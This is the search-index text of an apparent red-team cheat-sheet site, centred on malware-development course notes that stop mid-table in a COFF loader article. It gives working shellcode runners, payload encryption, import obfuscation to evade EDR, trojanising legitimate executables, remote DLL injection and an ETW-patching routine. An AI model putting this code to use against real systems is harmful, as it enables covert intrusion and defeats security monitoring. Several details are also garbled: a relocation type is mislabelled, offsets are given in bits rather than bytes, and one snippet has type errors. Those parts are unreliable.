{"./":{"url":"./","title":"Introduction","keywords":"","body":"CheatSheet Welcome here ! Please, feel free to browse anything that caught your interest. Formation Malware Development Introduction PE Payload Storage Payload Encryption Function Call Obfuscation Backdooring PE Malware Docs Code Snippet Dumpbin NTStructure Passing Arguments COFF Loader Elastic EDR ETW Function Hooking Kernel Callback Module Stomping Reflective DLL Injection Pentest Cloud Azure Configuration Review Database Kubernetes KubernetesCIS Services AD DNS IPMI Kerberos LDAP Memcached NFS Oracle Database MSSQL RPC SMB SNMP Tomcat WebDAV Techniques Abuse Tokens Buffer Overflow Command Injection Data Exfiltration Exploit handles Filtering Kioske Escape LFI Password Spraying Pivoting Privilege Escalation Windows Linux Reverse Shell Shellshock SQL Injection SSTI Technology AD IOS NAC Port Knocking SAML SAP Tools BloundHound CME Curl FFUF Find Hydra PowerView Powershell Responder Rubeus Strace Wfuzz Rainy Sunday KMS Activation Licence Key "},"Formation/RTO - Malware Development/0 - Introduction.html":{"url":"Formation/RTO - Malware Development/0 - Introduction.html","title":"Introduction","keywords":"","body":"Introduction Table of content What is malware development Why learn it ? What you will learn ? What is malware development It is the process of creating your own program which does whatever you need it to be done. Inject code in existing process ByPass detection during intrusion Setup some persistance on the system Escalate his privileges Why learn it ? In redteaming, malware development is a key assets. Threat hunters have severals tools to detect standard offesnive tools. Malware development help to understand how standard tools works and how they can be upgraded to bypass detection tools. What you will learn ? Dropper for any payload (Meterpreter, Empire...) Backdoor exisiting program How to hide program against static and dynamic analysis Inject payloads in another process It a basic skills for developping more sphisticated malware you will have to create during redteam engagement. "},"Formation/RTO - Malware Development/1 - PE.html":{"url":"Formation/RTO - Malware Development/1 - PE.html","title":"PE","keywords":"","body":"PE Table of content What is PE Structure of a PE Sections Exe Source code DLL Source code Tools Analyze PE headers Compile Exe Compile DLL What is PE PE stand for Portable Executable It's a way to organize an executable code into a file. Structure of a PE PE file can be considered as a book. Thus, it contains the data and metadata containing information about the book itself and the data it contains. PE file are organized in headers and sections. Headers : contain the metadata Sections : contain the data itself (code, imports, data...) Sections .text : contain executable code .rdata : readonly data .data : global variable .pdata : information about exceptions .rsrc : contain diffents objects such as images, icon, other PE file (dll, executable). This section give a lot of possibilities for malware develoment .reloc : it allows the Windows loader to safe reaload the module (.dll) in memory with randomized address space The most important is .text, .data and .rserc Exe Seperate program that can be load in memory as an independent process. Need a main function that will be called by the OS loader when it finished the job. Source code int main(int argc, char* argv){ ... } DLL PE modules that are loaded in existing process and cannot live independently. Main purpose is to deliver some functionnality the calling process needs. The loader already created a process and the porcess need the DLL to be loaded on the process. Thus, it will create an empty address space and load the DLL main code inside. This main code will initialize the library and give back the control to the process that will be able to call DLL function. When the malware is packed as a DLL, the DLL main must be created and exporting at least one function. Source code BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_PROCESS_DETACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: break; } return TRUE; } The DLLMain can be called for several reason: When the process load the DLL (idem for thread) When the process unload the DLL (idem for thread) The switch allow to design different behavior depending on the event resulting in DLLMain call. To run a DLL: rundll32 ${file.dll} ${exportedMethod} Tools Analyze PE headers PEBear : https://github.com/hasherezade/pe-bear-releases Visual Studio : #In a visual studio command prompt #To see header dumpbin /headers ${file.exe} #To see exported function (DLL) dumpbin /export ${file.dll} #To see dll imported by an exe dumpbin /imports file.exe Compile Exe cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /${exeCode.cpp} /link /OUT:${exeFile.exe} /SUBSYSTEM:CONSOLE /MACHINE:x64 Compile DLL cl.exe /D_USRDLL /D_WINDLL ${dllCode.cpp} /MT /link /DLL /OUT:${dllFile.dll} "},"Formation/RTO - Malware Development/2 - Payload Storage.html":{"url":"Formation/RTO - Malware Development/2 - Payload Storage.html","title":"Payload Storage","keywords":"","body":"Payload Storage Table of content Droppers Where to store payload ? Text Code Compile Data Code Rsrc Code Compile Droppers Specials programs used to deliver the payload to the target machine. For example, during phishing attack your code is executed on the target machine. This executed code is the dropper. It can be a simple program or a complexe one but the final goal is to deliver the main payload to the machine and execute it. Where to store payload ? Payloads can be stored in PE sections. The most used are: .text .data .rsrc Text Code It must be put in the code of one function (the main for example) #include #include #include #include int main(void) { void * exec_mem; BOOL rv; HANDLE th; DWORD oldprotect = 0; // 4 byte payload unsigned char payload[] = { 0x90, // NOP 0x90, // NOP 0xcc, // INT3 : give process flow to debugger 0xc3 // RET }; unsigned int payload_len = 4; // Allocate a memory buffer for payload exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); printf(\"%-20s : 0x%-016p\\n\", \"payload addr\", (void *)payload); printf(\"%-20s : 0x%-016p\\n\", \"exec_mem addr\", (void *)exec_mem); // Copy payload to new buffer RtlMoveMemory(exec_mem, payload, payload_len); // Make new buffer as executable // This is not done during the first allocation because it is weird that a memory space is RWX at the same time. // Doing this in two step allow basic evasion. rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect); printf(\"\\nHit me!\\n\"); getchar(); // If all good, run the payload if ( rv != 0 ) { th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0); WaitForSingleObject(th, -1); } return 0; } Compile @ECHO OFF cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 Data Code Tell the compiler that the payload is readonly data. The simple way to do that is to create a global variable handling the payload. #include #include #include #include // The payload is not declared in the code but linked during compilation int main(void) { [...] } ### Compile ```bat @ECHO OFF cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 Rsrc Code Its a dedicated section to stored other files. Thus, create a file containing the payload and tell the compiler that this file must be part of the .rsrcsection. Then the code has to use a specific API to reach out the .rsrc section and extract the payload from their. int main(void) { HGLOBAL resHandle = NULL; HRSRC res; unsigned char * payload; unsigned int payload_len; // Extract payload from resources section // FindResource ask the system to locate the ressource (FACIVON_ICON) from the PE file // It return an handle to a ResourceInfoBlock res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA); // Use the ResourceInfoBlock handle and return another handle to the module containing the resource resHandle = LoadResource(NULL, res); // Return a pointer to the first byte of the resource payload = (char *) LockResource(resHandle); // Return the size of the resource payload_len = SizeofResource(NULL, res); Compile @ECHO OFF Rem The resource.rc link the type of data to the file containing the data Rem rc is the ressource compiler and take as argument the ressource file rc resources.rc Rem cvtres convert the resource compiled file to an object file that can be undesrtood by the C compiler cvtres /MACHINE:x64 /OUT:resources.o resources.res Rem THe compilation include the resource file cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 resources.o "},"Formation/RTO - Malware Development/3 - Payload Encryption.html":{"url":"Formation/RTO - Malware Development/3 - Payload Encryption.html","title":"Payload Encryption","keywords":"","body":"Payload Encryption Table of content Base 64 XOR Encryption AES Encryption Base 64 This technique is quick but dirty. It will ne be helpfull to avoid detection because AV/EDR easily decode them #include #pragma comment (lib, \"Crypt32.lib\") int DecodeBase64( const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) { DWORD outLen; BOOL fRet; outLen = dstLen; fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL); if (!fRet) outLen = 0; // failed return( outLen ); } XOR Encryption void XOR(char * data, size_t data_len, char * key, size_t key_len) { int j; j = 0; for (int i = 0; i AES Encryption #include #pragma comment (lib, \"crypt32.lib\") #pragma comment (lib, \"advapi32\") #include int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) { HCRYPTPROV hProv; HCRYPTHASH hHash; HCRYPTKEY hKey; if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){ return -1; } if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){ return -1; } if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){ return -1; } if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){ return -1; } if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){ return -1; } CryptReleaseContext(hProv, 0); CryptDestroyHash(hHash); CryptDestroyKey(hKey); return 0; } "},"Formation/RTO - Malware Development/4 - Function Call Obfuscation.html":{"url":"Formation/RTO - Malware Development/4 - Function Call Obfuscation.html","title":"Function Call Obfuscation","keywords":"","body":"Function Call Obfuscation Table of content What is it ? Windows API GetModuleHandle GetProcAddress Hands on Step 1 : making VirtualProtect disappear from the dumpbin output Step 2 : Making every reference of VirtualProtect disappear What is it ? Every PE modules usually use external function and when it run it will call functions from externals that will be map to the process memory to make them available. By analyzing the DLL and functions used by the binary it can be a good indicator about what do the binary. EDR can collect the function used by the process and compare them to a list of well known functions used by malware. The goal of function call obfuscation is a way of hiding DLL and functions call that will be used during runtime. Windows API GetModuleHandle dllHandle = GetModuleHandle(\"file.dll\") Return a handle to the specified DLL GetProcAddress function = GetProcAddress(dllHandle, \"functionFromDll\") Get the memory address of the function you need and that is exported from the DLL Hands on Step 1 : making VirtualProtect disappear from the dumpbin output Find declaration of VirtualProtect : Use Google and MSDN documentation. // Declared in Kernel32.dll BOOL VirtualProtect( [in] LPVOID lpAddress, [in] SIZE_T dwSize, [in] DWORD flNewProtect, [out] PDWORD lpflOldProtect ); In the code declare a new global variable : // It will store the address to `VirtualProtect` BOOL (WINAPI * pVirtualProtect)( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) Retrieve the address :: pVirtualProtect = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualProtect\") Call the function from the created handler : rv = pVirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect); Conclusion : The VirtualProtect function is not list when dumpbin is used. However, the VirtualProtect string is still here in the code strings. Step 2 : Making every reference of VirtualProtect disappear XOR all string containing VirtualProtect : The problem is your key will be easily spot using the Strings Sysinternals or with some reverse engineering Use one of the binary string as the XOR key : String the binary and choose one of the string as the key. Thus, if someone also string the executable, the key will not be easily spoted. Conclusion : The VirtualProtect does not appear on dumpbin /imports file.exe and does not also appear when the executable is stringed. "},"Formation/RTO - Malware Development/5 - Backdooring PE.html":{"url":"Formation/RTO - Malware Development/5 - Backdooring PE.html","title":"Backdooring PE","keywords":"","body":"Backdooring PE Table of content Trojans, what is is ? Use case How to backdoor PE files Hands on Find the code cave Jump on your code cave Save the program state Paste the shellcode Restore the machine state Trojans, what is is ? Trojans are regular programs mimicking a legit program and running a malware in the foreground. The purpose is to convince the victim the program she used is a legit one and she can use it. Use case You have access to a file server used by a company. You can backdoor one of their legit program to turn it into a trojan and make it execute your malware. If you target an executable that need high privileges, such as PsExec you can use it for privileges escalation and move laterally. How to backdoor PE files Code cave : spare space in a PE file such as a text segment that is not occupied by data. The downsize is the avalaible size you get to inject your malware (few hundred bytes of space). New section : it is the most powerfull method cause it gives you the freedom to create a size on any size you need. The downsize is that you have to set the section as executable and EDR can easily spot it. Extending section : you pick some section and increase its size to host your code. It can be done with the text section but need more effort These methods can be combined : you find a little code cave in the text section and then you load your shellcode in it. Your shellcode will then load additional code from another section or resources. This section does not need to be set as executable and thus, it limits the detection. Hands on Find the code cave You can use a decompiler or a debugger to find free space in the .text section. Usually, there is free space at the end of the program: Jump on your code cave The program must be patched to jump on the code cave. Thus, locate the address of the code cave, and replace one instruction with : jmp ${codeCaveAddress} Do not forget to save the instruction erased to restore them at the end of you shellcode. To avoid program disruption, the shellcode must return to the primary address or the program will crash. Save the program state The shellcode will change the program state (register, stack, etc...). Thus, the state must be saved before executing the shellcode. The first shellcode instruction must be : pushad : push all registers on the stack pushfd : push all flags on the stack Paste the shellcode The shellcode can be pasted on the code cave. Restore the machine state At the end of the shellcode, the stack, register and flag state must be restored : popfd : restore the flags from the stack popad : restore the registers from the stack Then you need to restore the instructions replaced by the originel jump. Finally, jump just after the initial jump. "},"Malware/Docs/Code snippet.html":{"url":"Malware/Docs/Code snippet.html","title":"Code Snippet","keywords":"","body":"Code snippets Table of content C printf DEBUG macro Read a full file NtCurrentProcess Typedef NTDLL functions Inject DLL in process Run shellcode Patch ETW C printf DEBUG macro #define DEBUG(x, ...) printf(x, ##__VA_ARGS__) Read a full file void readFile(char* filename, char** string) { FILE* f = fopen(filename, \"rb\"); if (!f) { printf(\"Cannot open the file\\n\"); return; } fseek(f, 0, SEEK_END); size_t fsize = ftell(f); fseek(f, 0, SEEK_SET); *string = (char*)malloc(fsize + 1); if (!*string) { printf(\"Cannot allocate string buffer\"); return; } fread(*string, fsize, 1, f); fclose(f); (*string)[fsize] = 0; } NtCurrentProcess #define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 ) Typedef NTDLL functions typedef NTSTATUS(NTAPI *pNtSetInformationProcess)( HANDLE ProcessHandle, PROCESS_INFORMATION_CLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength ); Inject DLL in process #include #include BOOL injectDLL(char *moduleToInject, DWORD processPID) { // open the target process HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processPID); // allocate the memory page to inject the DLL path void* remoteBuffer = VirtualAllocEx(processHandle, NULL, strlen(moduleToInject) * sizeof(char), MEM_COMMIT, PAGE_READWRITE); if (!remoteBuffer) { return FALSE; } // inject the dll name BOOL status = WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, strlen(moduleToInject) * sizeof(char), NULL); if (!status) { return FALSE; } // load the dll with LoadLibraryW HMODULE kernel32 = GetModuleHandleA(\"Kernel32.dll\"); if (!kernel32) { return FALSE; } PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(kernel32, \"LoadLibraryA\"); if (!threadRoutine) { return FALSE; } HANDLE dllThread = CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL); if (!dllThread) { return FALSE; } WaitForSingleObject(dllThread, 1000); return TRUE; } Run shellcode ((void(*)())entrypointAddress)(); Patch ETW void patchETW(){ Pvoid NtTraceEvent = GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtTraceEvent\"); DWORD dwOld; DWORD retPatch = 0xc3; VirtualProtect((DWORD64)NtTraceEvent + 3, 1, PAGE_EXECUTE_READWRITE, &dwOld); CopyMemory((DWORD64)NtTraceEvent + 3, &retPatch, 1); VirtualProtect((DWORD64)NtTraceEvent + 3, 1, dwOld, &dwOld); } "},"Malware/Docs/Dumpbin.html":{"url":"Malware/Docs/Dumpbin.html","title":"Dumpbin","keywords":"","body":"Dumpbin Table of content Display sections Display symbol table Display sections dumbin.exe /SECTION ${exe} # Section information dumpbin.exe /SECTION:${sectionName} ${exe} Display symbol table dumpbin.exe /symbols ${exe} "},"Malware/Docs/NTStructure.html":{"url":"Malware/Docs/NTStructure.html","title":"NTStructure","keywords":"","body":"NtStructures Table of content LDR_DATA_TABLE_ENTRY Resource LDR_DATA_TABLE_ENTRY The LDR_DATA_TABLE_ENTRY structure is NTDLL’s record of how a DLL is loaded into a process. This list can be accessed through the process PEB as it point to the InLoadOrderModuleList, InMemoryOrderModuleList and InInitializationOrderModuleList. The structure can be found in the winternl.h but it's a modified structure as it only contains the InMemoryOrderLinks, DllBase, FullDllName, CheckSum and TimeDateStamp entries. Even if this structure is supposed instable ie can be modified between Windows version, it appears to be quite the same since the original Windows: they did not replace or modify values but only add additional values. For example, in Windows 6.2, they add the LIST_ENTRY HashLinks parameter that contains the list of the modules names hashed using the x65599 hashing algorithm that can be accessed through LdrpHashUnicodeString (that internaly uses RtlHashUnicodeString whose default hash algorithm is x65599). This may have been implemented to fasten the module lookup performed through GetModuleHandle (for loaded modules) or GetProcAddress (for export function). Resource https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntldr/ldr_data_table_entry.htm "},"Malware/Docs/Passing arguments.html":{"url":"Malware/Docs/Passing arguments.html","title":"Passing Arguments","keywords":"","body":"Passing Arguments Table of content x64 x64 Integer valued arguments in the leftmost four positions are passed in left-to-right order in RCX, RDX, R8, and R9, respectively. The fifth and higher arguments are passed on the stack. Parameter type fifth and higher fourth third second leftmost Floating-point stack XMM3 XMM2 XMM1 XMM0 Integer stack R9 R8 RDX RCX Aggregates (8, 16, 32, or 64 bits) and __m64 stack R9 R8 RDX RCX Other aggregates, as pointers stack R9 R8 RDX RCX __m128, as a pointer stack R9 R8 RDX RCX func1(int a, int b, int c, int d, int e, int f); // a in RCX, b in RDX, c in R8, d in R9, f then e pushed on stack func2(float a, double b, float c, double d, float e, float f); // a in XMM0, b in XMM1, c in XMM2, d in XMM3, f then e pushed on stack func3(int a, double b, int c, float d, int e, float f); // a in RCX, b in XMM1, c in R8, d in XMM3, f then e pushed on stack func4(__m64 a, __m128 b, struct c, float d, __m128 e, __m128 f); // a in RCX, ptr to b in RDX, ptr to c in R8, d in XMM3, // ptr to f pushed on stack, then ptr to e pushed on stack "},"Malware/CoffLoader.html":{"url":"Malware/CoffLoader.html","title":"COFF Loader","keywords":"","body":"CoffLoader Introduction Portable Executable (PE) Store data in a PE Reference to functions and variables during execution Object files Overview Coff Loader BOF or COFF ? BOF advantages BOF disadvantage Hands on : COFF Loader Blueprint COFF specification COFF Header Sections Header Navigate into sections Relocations Table Absolute and Relative address Symbol Table Symbol Table String Conclusion Write sections in memory Perform relocations Special symbol Standard symbol relocation Put things altogether Run the code Upgrade Compatibility with CobaltStrike BOF CobaltStrike BOF specificities Add support for beacon internal functions Format parameters for CobalStrike BOF Dynamic .got and .bss Conclusion Ressources Introduction COFF stands for Common Object Files. The COFF format is initially used for Linux ELF executables but is now used by Microsoft for many years now. For example, the Windows executable, also known as PE are formatted following the COFF format. Likewise, the object files generated during compilation and the shared libraries follows the same format. The goal of this article is to dive into the COFF format to understand how it can describe a full executable file. Then, the Windows object files will be analyzed to finally lead to the development COFF Loader: a program that can run a Windows object file in memory. A COFF Loader is a program taking as input an Windows object file and execute it as a standard executable file. This technic is often used by malware as the program will only exist in memory, limiting the malware footprint. Moreover, because the program is fully executed in memory, it will be harder for detection solutions such as anti-virus or EDR to detect it and prevent its execution. Portable Executable (PE) Store data in a PE PE is a format used by the Windows executable. ┌──(pikachu㉿Kali)-[~/Share] └─$ file windowsExecutable.exe windowsExecutable.exe: PE32+ executable (console) x86-64, for MS Windows The PE is structured as a book. Indeed, the PE has a global header that contains information about itself such as a book cover and all the data is organized in chapters called sections. All sections get their own header. Each section goal is different and they are used to organize all the data needed for the program proper functioning. PE files can be inspected through several tools such as CFFExplorer. As it is shown in the previous figure, the PE is organized in different sections: .text : this section is used to store the executable code. .bss : this section is used to store any uninitialized global variable. Thus, if you use the statement int a; outside of any function or module, this variable will likely be stored in the .bss section. As all data are uintialized, this section is always empty. It is generated and populated at runtime. .data : this section is used to store initialized global variable. If in your code you have the statement int a = 5; outside of any function or module, this information will be stored in this section. .rdata : this section is used to store initialized read-only global variable. These variables will not change during the whole program execution. For example, the statement const int a = 5; outside of any function or module will likely end in the .rdata section. .pdata : this section is used to store the functions used for error handling. This section contains all the information needed to unwind the stack when an exception is raised. Its content is really interesting to implement Thread Stack Spoofing. .xdata : this section is used to store the .pdata exception information. .idata : this section is used to store the import directory table that is used to store the addresses used during DLL loading. .reloc : this section is used to store relocation information. When a program is compiled, the compiler choose a base import address. This address is the one where the program will be loaded in memory. But if this address is already used, the OS will load it at another random address not known during compile time. This load address shift will break references to symbols that use absolute address. Indeed, if a symbols is supposed to be located at baseAddress + 0x10, the base address shift will break the reference. The .reloc section contains all the information needed to easily relocate these symbols depending on the executable load address. Reference to functions and variables during execution The PE contains all the data needed to run the program. The .text section contains the executable code but usually all variables or functions are contained in other sections. Thus, during execution time, the code must be able to find these references ie, it must be able to find the address of the symbol in its definition section. For example, the following C code: #include char myVariable[16] = \"Hello World !\\n\"; int main(void){ printf(\"%s\", myVariable); } Once decompiled during execution, the main function looks like this : 00007FF7390B187B lea rdx,[myVariable (7ff6c959c000h)] 00007FF7390B1882 lea rcx,[string \"%s\" (7ff6c9599c24h)] 00007FF7390B1889 call printf (7ff6c959118bh) Following the standard x64 argument convention, the two printf arguments are stored in RDX and RCX. Looking at the memory mapping using vmmap or ProcessHacker, the following section mapping is performed: The section with RX rights is the .text section. When the PE is loaded in memory, the sections are mapped in the same order they are defined in the PE : .text : 0x7ff6c9591000 .rdata: 0x7ff6c9599000 .data : 0x7ff6c959c000 Opening the section .data displays the myVariable value that is Hello World!. Thus, when a global data is used in C, the compiler will store the data in the .data section and replace each use of the data by its address in the ASM generated code. The same analysis can be done with the following code : #include const char myReadOnlyVariable[16] = \"ReadOnly \\n\"; int main(void){ printf(\"%s\", myReadOnlyVariable); } This time, due to the use of const the variable will be located in the .rdata section. So, when a C code is compiled and linked, the ASM generated code is located in the .text section, the variables, functions and libraries are located in the other sections depending on their uses. Finally, the .text section is modified to point on the right section each time a variable or a function is referenced. Usually, the .text section does not contain any data but just references (addresses) to the section containing the data. This behavior can be tweaked through compiler and linker option but we will just sticking up to the general case. Object files Overview Object files are binary files generated during a program compilation. The generated object files are then linked to generate the PE executable: The compiler transforms the source code into object files. These files contain exactly the same amount of information the source code has but cannot be understood by the OS. Moreover, the compilation generate symbols that represent the variable but these symbols do not point to anything. For example, if one variable is defined in the file1.c but used in the file2.c, and the file2.o file is \"executed\" by the OS it will not be able to find the variable defined in file1.c and the \"program\" will crash. For example, the following code: // file1.c char myVariable[16] = \"Hello World !\\n\"; // file2.c extern char myVariable[16]; int main void(){ printf(\"%s\", myVariable); } Once disassembled, the main function contained in file2.obj looks like: 000000000000001B: 48 8D 15 00 00 00 00 lea rdx,[myVariable] 0000000000000022: 48 8D 0D 00 00 00 00 lea rcx,[??_C@_02DKCKIIND@?$CFs@] 0000000000000029: E8 00 00 00 00 call __imp_printf Instead of getting addresses, as for full compiled PE, the Object File uses symbols. myVariable is the symbol that represents the variable myVariable defined in file1.c ??_C@_02DKCKIIND@?$CFs@ is the symbol that represents the %s __imp_printf is the symbol that represents the printf function. As it can be seen the object file contains all the symbols, but if the raw bytes are analyzed, the address that should point to the symbol is empty (0x000000). Thus, the object file cannot be executed as a PE. Making the cross reference between object file and generating the address of each symbol is the linker job. During the compilation time, the variables and functions defined in the source code are transformed into symbols in the object files. The linker will then process the symbol of each object files, cross reference them, generate the address and build the executable. On the previous example, the linker will map all the file1.o symbols and give them an address in the file. Then, it will map all the symbols of file2.o and resolve the external symbol myVariable to its definition address defined during the file1.o mapping. Coff Loader A COFF Loader is a program that will take an object file as input, will resolve all symbols to make it executable by the OS, store the symbols in memory and run the program described by the object file in-memory. Thus a COFF Loader is more or less a mini-linker that will perform in-memory linking and execution. For now, each time the word COFF is used, it will designate a Windows object file. Likewise, the BOF name can also be used. BOF or COFF ? A COFF Loader is implemented is Cobalt Strike. The COFF used are modified program integrating functions that can interact with the CobaltStrike beacon enhance the name Beacon Object File or simply BOF. For instance, if you run the COFF wohami.o, the answer will be prompted to the standard stdin thus, will not be retrieved by the beacon and the operator will not be able to see the output. The fix this problem, the whoami.o COFF support some functions that can be used to talk with the beacon and send back execution output to the operator. BOF advantages Several technics can be used to execute binary in-memory. For example C# inline assembly, C++ ReflectiveDLL or Powershell IEX. However, these technics are based on a forkNrun pattern that involves process creation and process injection. They can be detected by security solutions as they let an important in-memory footprint and use heavily monitored WindowsAPI such as OpenProcess, WriteProcessMemory or CreateRemoteThreadEx. On the other hand, BOF can be executed in the current process and all the memory allocated can be cleaned after execution. Thus, its memory footprint is very small and its detection harder. Finally, the BOF generated executables are smaller and thus easier to be sent to the beacon over the network. For example, the whoami.exe executable size is 72kB, the BOF version is less than 7kB. BOF disadvantage Every techniques have their advantages and drawback. The main disadvantage of BOF is they share the same process as the beacon. Thus, the beacon cannot make any other actions while the BOF is executed. Likewise, if the BOF crashes during its execution, it will also kill the beacon. Finally, even if BOF development is not really difficult, they must be singled threaded and the whole code must be written in a single file. Thus, it can be hard to create an advanced application using only BOF. For example, creating a BOF version of Rubeus or Mimikatz can be quite challenging (but if you have one, please share it with me...) Hands on : COFF Loader Blueprint In order to develop the COFF Loader , the following tasks must be tackled down: Parse the COFF file according to the COFF specification Retrieve the COFF sections and map them in memory Resolve symbols and modify the sections to set the right reference address in the sections Resolve the external functions (such as printf) to set the right address in the sections Retrieve the section containing the executable code Run the code COFF specification A first approach of COFF specification has been seen in the PE part. However, COFF specification for PE and for Object File are similar but not identical. Indeed, the principle is the same, the COFF file is a book and is segmented in different sections. Among these sections there are the .text, .data, .rdata etc... with the same definition as those for the PE. However, the data contained in each section header is quite different. Moreover, other new parts are added. The COFF specification for Object File contains a Symbol Table that summarizes all symbols used and a Symbol String Table that contains the name of each symbol. Likewise, there is not any .reloc section in COFF file but there is a Relocation Table that contains all the information needed to resolve symbols, compute their address and modify the sections' code to fix symbols references. The following figure summarizes the structure of a COFF file: COFF Header The COFF header specification can be found here in the Microsoft documentation. The file header starts at the offset 0. The following C structure can be used to handle the COFF header: typedef struct _CoffHeader { uint16_t machine; uint16_t numberOfSections; uint32_t timeDateStamp; uint32_t pointerToSymbolTable; uint32_t numberOfSymbols; uint16_t sizeOfOptionalHeader; uint16_t characteristics; } CoffHeader; The machine value is a number defining for which architecture the COFF file have been compiled. For example, the value 0x8664 represents an x64 architecture. The value pointerToSymbolTable is the offset of the symbol table. Thus, the header can be used to directly jump to the Symbol Table : // pseudo code // void *data : address of the first COFF byte CoffSymbol* firstSymbol = data + coffHeader.pointerToSymbolTable; The optional headers are empty on a File Object COFF structure. The characteristic value represents the COFF type and its possible values are resumed in the Microsoft documentation. Sections Header Right after the file header, there are the section headers. These headers contains all the information needed to access the data contained in the different sections. The specification about section headers can be found here in the Microsoft documentation. The following C structure can be used to handle the sections header : typedef struct _CoffSection { char name[8]; uint32_t virtualSize; uint32_t virtualAddress; uint32_t sizeOfRawData; uint32_t pointerToRawData; uint32_t pointerToRelocations; uint32_t pointerToLinenumber; uint16_t numberOfRelocations; uint16_t numberOfLinenumber; uint32_t characteristics; } CoffSection; The name value is the section name (.text, .data, etc...). Not so much to say about it. The virtualSize and virtualAddress values are always set to 0 in COFF file as they are meant to contains the data once the PE is loaded in memory. The pointerToRawData data is the offset used to access to the data contained in the section. For example, if the section is the .text section, pointerToRawData data will point to the first executable bit. The value is absolute (ie from the byte 0 of the file) and not relative from the section (ie from the section address). The pointerToRelocations data is the offset used to access to the Relocation Table linked to the section (see the next part about relocation). As for the pointerToRawData, the offset is absolute and not relative. The pointerToLinenumber is usually 0 or can be ignored as this field is deprecated in COFF compilation. Navigate into sections During the COFF file parsing, it will be needed to navigate through the different sections. This can easily be done by leveraging the following facts : The total number of sections is given in the file header The first section header is located right after the file header The size of the file and section headers are constant and known The different section headers are stored in a continuous way Thus, to access to the section i the following pseudo-code can be used: // pseudo code // void *data : address of the first COFF byte CoffSection* section_i = data + HEADER_SIZE + i * SECTION_SIZE Relocations Table This table contains all the information needed to resolve symbols and modify the segment code to inject the symbol address. Once again, as an example, the following code is used: int main(void){ printf(\"Hello World !\\n\"); } The decompiled code stored in the Object File .text section is the following: .text 000000000000001B: 48 8D 0D 00 00 00 00 lea rcx,[??_C@_0M@KPLPPDAC@Hello?5World@] 0000000000000022: E8 00 00 00 00 call __imp_printf The addresses contained in the section are 0x00000000. If the .text section is loaded in memory as-is and run, the program will try to access to the address 0x00000000 and will crash. Thus, a relocation must be performed to replace the fake symbol address by the real one. On this example, two relocations must be performed : the ??_C@_0M@KPLPPDAC@Hello?5World@ and the __imp_printf. Thus, two entries will be present in the .text section relocation table. The following C structure can be used to handle each relocation entry: typedef struct _CoffReloc { uint32_t virtualAddress; uint32_t symbolTableIndex; uint16_t type; } CoffReloc; The virtualAddress value is the relative offset from the section start to the first byte of the address to modify. If the .text section contains only these two lines : 000000000000001B: 48 8D 0D 00 00 00 00 lea rcx,[??_C@_0M@KPLPPDAC@Hello?5World@] 0000000000000022: E8 00 00 00 00 call __imp_printf The virtual address for the relocations will be 0x03 and 0x08. The symbolTableIndex value contains the index of the symbol in the Symbol Table. This value is used to retrieve information about the symbol that must be relocated in the section. The type value is the relocation type ie the way the symbol address must be given in the section. These codes are dependent of the architecture. Only the interesting codes for x64 will be explained. Name Value Description IMAGE_REL_AMD64_ABSOLUTE 0x0000 The relocation is ignored IMAGE_REL_AMD64_ADDR64 0x0001 The symbol reference address in the section must be replaced by the 64bits absolute address of the symbol. IMAGE_REL_AMD64_ADDR64 0x0002 The symbol reference address in the section must be replaced by the 32bits absolute address of the symbol. IMAGE_REL_AMD64_ADDR32NB 0x0003 The symbol reference address in the section must be replaced by the 32bits relative address of the symbol from the current section IMAGE_REL_AMD64_REL32 0x0004 The symbol reference address in the section must be replaced by the 32bits relative address of the symbol from the current section minus an offset of 0 bits IMAGE_REL_AMD64_REL32_1 0x0005 The symbol reference address in the section must be replaced by the 32bits relative address of the symbol from the current section minus an offset of 1 bits IMAGE_REL_AMD64_REL32_2 0x0006 The symbol reference address in the section must be replaced by the 32bits relative address of the symbol from the current section minus an offset of 2 bits IMAGE_REL_AMD64_REL32_3 0x0007 The symbol reference address in the section must be replaced by the 32bits relative address of the symbol from the current section minus an offset of 3 bits IMAGE_REL_AMD64_REL32_4 0x0008 The symbol reference address in the section must be replaced by the 32bits relative address of the symbol from the current section minus an offset of 4 bits IMAGE_REL_AMD64_REL32_5 